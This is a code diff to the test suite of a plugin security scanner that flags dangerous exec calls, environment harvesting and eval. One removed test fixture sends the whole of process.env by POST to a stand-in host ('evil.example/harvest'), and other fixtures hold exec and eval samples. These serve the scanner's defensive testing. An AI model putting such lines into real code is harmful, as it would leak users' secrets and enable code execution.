@@ -88,39 +88,12 @@ function runSyncNamedCase(name: string, run: () => void) {
   }
 }
 
-function normalizeSkillScanOptions(
-  options?: Readonly<{
-    maxFiles?: number;
-    maxFileBytes?: number;
-    includeFiles?: readonly string[];
-    onlyIncludeFiles?: boolean;
-    excludeTestFiles?: boolean;
-  }>,
-): SkillScanOptions | undefined {
-  if (!options) {
-    return undefined;
-  }
-  return {
-    ...(options.maxFiles != null ? { maxFiles: options.maxFiles } : {}),
-    ...(options.maxFileBytes != null ? { maxFileBytes: options.maxFileBytes } : {}),
-    ...(options.includeFiles ? { includeFiles: [...options.includeFiles] } : {}),
-    ...(options.onlyIncludeFiles != null ? { onlyIncludeFiles: options.onlyIncludeFiles } : {}),
-    ...(options.excludeTestFiles != null ? { excludeTestFiles: options.excludeTestFiles } : {}),
-  };
-}
-
 type FixtureFiles = Record<string, string | undefined>;
 
 type SummaryCase = {
   name: string;
   files: FixtureFiles;
-  options?: Readonly<{
-    maxFiles?: number;
-    maxFileBytes?: number;
-    includeFiles?: readonly string[];
-    onlyIncludeFiles?: boolean;
-    excludeTestFiles?: boolean;
-  }>;
+  options?: SkillScanOptions;
   expected: {
     scannedFiles: number;
     critical?: number;
@@ -153,28 +126,31 @@ spawn("node", ["second.js"]); execFile("node", ["third.js"]);
     expect(findings.map((finding) => finding.line)).toEqual([3, 4, 4]);
   });
 
-  it("bounds dense line-rule findings and reports truncation", () => {
-    const source = [
-      `import { spawn } from "node:child_process";`,
-      ...Array.from({ length: 40 }, (_, index) => `spawn("node", ["${index}.js"]);`),
-    ].join("\n");
+  it.each(["spawn", "execFile as spawn"])(
+    "bounds dense line-rule findings and reports truncation for %s",
+    (binding) => {
+      const source = [
+        `import { ${binding} } from "node:child_process";`,
+        ...Array.from({ length: 40 }, (_, index) => `spawn("node", ["${index}.js"]);`),
+      ].join("\n");
 
-    const findings = scanSource(source, "plugin.ts").filter((candidate) =>
-      candidate.ruleId.startsWith("dangerous-exec"),
-    );
+      const findings = scanSource(source, "plugin.ts").filter((candidate) =>
+        candidate.ruleId.startsWith("dangerous-exec"),
+      );
 
-    expect(findings).toHaveLength(33);
-    expect(findings.slice(0, -1).every((finding) => finding.ruleId === "dangerous-exec")).toBe(
-      true,
-    );
-    expect(findings.at(-1)).toMatchObject({
-      ruleId: "dangerous-exec-truncated",
-      severity: "critical",
-      line: 41,
-      message: "8 additional dangerous-exec matches omitted after 32 findings",
-      evidence: "[8 additional matches omitted after 32 findings]",
-    });
-  });
+      expect(findings).toHaveLength(33);
+      expect(findings.slice(0, -1).every((finding) => finding.ruleId === "dangerous-exec")).toBe(
+        true,
+      );
+      expect(findings.at(-1)).toMatchObject({
+        ruleId: "dangerous-exec-truncated",
+        severity: "critical",
+        line: 41,
+        message: "8 additional dangerous-exec matches omitted after 32 findings",
+        evidence: "[8 additional matches omitted after 32 findings]",
+      });
+    },
+  );
 
   it("keeps bounded evidence free of lone surrogates", () => {
     const source = `${"a".repeat(119)}😀 child_process.exec("echo unsafe")`;
@@ -444,15 +420,6 @@ pool["spawn"](job);
     expectRulePresence(findings, "dangerous-exec", false);
   });
 
-  it("does not use full-line comments as source-rule context", () => {
-    const source = `
-const env = process.env;
-// fetch() can reach the endpoint later.
-`;
-    const findings = scanSource(source, "plugin.ts");
-    expectRulePresence(findings, "env-harvesting", false);
-  });
-
   it("does not use inline or block comments as source-rule context", () => {
     const source = `
 const env = process.env; // fetch("https://example.invalid")
@@ -463,16 +430,6 @@ const url = "https://example.com/path//segment";
 `;
     const findings = scanSource(source, "plugin.ts");
     expectRulePresence(findings, "env-harvesting", false);
-  });
-
-  it("returns empty array for clean plugin code", () => {
-    const source = `
-export function greet(name: string): string {
-  return \`Hello, \${name}!\`;
-}
-`;
-    const findings = scanSource(source, "plugin.ts");
-    expect(findings).toStrictEqual([]);
   });
 
   it("returns empty array for normal http client code (just a fetch GET)", () => {
@@ -510,15 +467,6 @@ export async function sendMessage(rest, channelId, data) {
 `;
     const findings = scanSource(source, "provider-bundle.js");
     expectRulePresence(findings, "env-harvesting", false);
-  });
-
-  it("still flags local process.env sends", () => {
-    const source = `
-const env = process.env;
-await fetch("https://evil.example/harvest", { method: "POST", body: JSON.stringify(env) });
-`;
-    const findings = scanSource(source, "plugin.ts");
-    expectRulePresence(findings, "env-harvesting", true);
   });
 });
 
@@ -740,10 +688,7 @@ describe("scanDirectoryWithSummary", () => {
       await runNamedCase(testCase.name, async () => {
         const root = makeTmpDir();
         writeFixtureFiles(root, testCase.files);
-        const summary = await scanDirectoryWithSummary(
-          root,
-          normalizeSkillScanOptions(testCase.options),
-        );
+        const summary = await scanDirectoryWithSummary(root, testCase.options);
         expect(summary.scannedFiles).toBe(testCase.expected.scannedFiles);
         if (testCase.expected.critical != null) {
           expect(summary.critical).toBe(testCase.expected.critical);
@@ -950,15 +895,37 @@ describe("scanDirectoryWithSummary", () => {
     readSpy.mockRestore();
   });
 
-  it("reuses cached directory listings for unchanged trees", async () => {
+  it("discovers added files when directory timestamps are restored", async () => {
     const root = makeTmpDir();
     fsSync.writeFileSync(path.join(root, "cached.js"), `export const ok = true;`);
+    const modifiedAt = new Date("2026-01-01T00:00:00Z");
+    await fs.utimes(root, modifiedAt, modifiedAt);
 
-    const readdirSpy = vi.spyOn(fs, "readdir");
-    await scanDirectoryWithSummary(root);
-    await scanDirectoryWithSummary(root);
+    expect((await scanDirectoryWithSummary(root)).critical).toBe(0);
+    fsSync.writeFileSync(path.join(root, "added.js"), `eval("untrusted");`);
+    await fs.utimes(root, modifiedAt, modifiedAt);
 
-    expect(readdirSpy).toHaveBeenCalledTimes(1);
-    readdirSpy.mockRestore();
+    const summary = await scanDirectoryWithSummary(root);
+    expect(summary.scannedFiles).toBe(2);
+    expectRulePresence(summary.findings, "dynamic-code-execution", true);
+  });
+
+  it("bounds traversal of trees without scannable files and marks the result incomplete", async () => {
+    const root = makeTmpDir();
+    const fixture = path.join(root, "asset.png");
+    await fs.writeFile(fixture, "image");
+    const readDirectory = fs.readdir.bind(fs);
+    const readdir = vi.spyOn(fs, "readdir").mockImplementation(async (...args) => {
+      const [entry] = await readDirectory(...args);
+      return Array.from({ length: 100_001 }, () => entry!);
+    });
+    try {
+      const summary = await scanDirectoryWithSummary(root);
+      expect(summary.scannedFiles).toBe(0);
+      expect(summary.truncated).toBe(true);
+      expect(summary.findings).toEqual([]);
+    } finally {
+      readdir.mockRestore();
+    }
   });
 });
